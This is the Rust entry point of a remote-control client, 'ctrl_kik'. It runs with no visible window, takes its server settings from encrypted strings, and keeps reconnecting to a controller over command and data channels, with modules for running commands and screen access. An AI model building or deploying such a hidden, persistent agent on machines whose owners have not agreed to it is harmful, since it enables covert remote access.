#![windows_subsystem = "windows"] //此宏不打开窗口，同时print也失效

use crate::context::Context;
use chrono::Local;
use common::config::{Config, Id, SecurityConfig};
use common::generated::encrypted_strings::*;
use common::host::get_host;
use log::debug;
use std::env;
use std::io::Write;
use std::path::Path;
use std::time::Duration;
use tokio::fs::{File, OpenOptions};
use tokio::time;

mod cmd_runner;
mod cmd_util;
mod context;
mod kik_conn;
mod kik_data_conn;
mod read_handle;
mod screen;

#[tokio::test]
async fn test() {
    use common::file_util;
    let test_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("ctrl_kik_get_dir_size_test");

    // 测试数据必须留在仓库 target 目录内，避免依赖开发机私有盘符。
    let _ = tokio::fs::remove_dir_all(&test_dir).await;
    tokio::fs::create_dir_all(test_dir.join("nested"))
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("a.bin"), [1_u8, 2, 3])
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("nested").join("b.bin"), [4_u8, 5])
        .await
        .unwrap();

    assert_eq!(file_util::get_dir_size(&test_dir).await.unwrap(), 5);
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    if "DEBUG".eq(env::var("LOG").unwrap_or("test".to_string()).as_str()) {
        env_logger::Builder::new()
            // 关键：定义自定义格式
            .format(|buf, record| {
                writeln!(
                    buf,
                    "{} [{}] - {}",
                    Local::now().format("%Y-%m-%d %H:%M:%S%.3f"), // 添加毫秒
                    record.level(),
                    record.args()
                )
            })
            .parse_env("LOG")
            .init();
    }
    //此lock在程序结束时会被操作系统回收，所以无需担心是否释放
    let _single_lock = single(LOCK_FILE_PATH()).await?;
    let context = Context::new();
    let config = Config {
        id: Id {
            username: "".to_string(),
            password: "".to_string(),
        },
        server_host: get_host(),
        server_port: PORT(),
        read_timeout: Duration::from_secs(45),
        write_timeout: Duration::from_secs(45),
        security: SecurityConfig::plain(),
    };

    loop {
        for _ in 0..3 {
            //校验成功了就返回
            match kik_conn::kik_conn(context.clone(), &config).await {
                Ok(h) => {
                    //加入服务器成功后发起数据连接
                    let (data_context, data_config) = (context.clone(), config.clone());
                    tokio::spawn(async move {
                        //校验成功就会返回
                        for _ in 0..3 {
                            match kik_data_conn::kik_data_conn(data_context.clone(), &data_config)
                                .await
                            {
                                Ok(_) => {}
                                Err(e) => {
                                    debug!("{}", e);
                                }
                            }
                        }
                    });
                    let _ = h.await;
                    context.clear().await;
                    context.set_kik(None).await;
                }
                Err(error) => {
                    debug!("命令连接失败: {}", error);
                    time::sleep(Duration::from_secs(2)).await;
                }
            }
        }

        time::sleep(Duration::from_secs(20)).await;
    }
}

pub async fn single<P: AsRef<Path>>(lock_path: P) -> anyhow::Result<File> {
    use fs4::tokio::AsyncFileExt;
    if let Some(parent) = lock_path
        .as_ref()
        .parent()
        .filter(|path| !path.as_os_str().is_empty())
    {
        tokio::fs::create_dir_all(parent).await?;
    }
    let lock_file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .truncate(false)
        .open(lock_path)
        .await?;
    let mut last_error = None;
    for _ in 0..3 {
        match lock_file.try_lock_exclusive() {
            Ok(_) => return Ok(lock_file),
            Err(error) => last_error = Some(error),
        }
        time::sleep(Duration::from_secs(1)).await;
    }
    Err(anyhow::anyhow!(
        "已有 ctrl_kik 实例运行或无法取得运行锁: {}",
        last_error
            .map(|error| error.to_string())
            .unwrap_or_else(|| "未知错误".to_string())
    ))
}
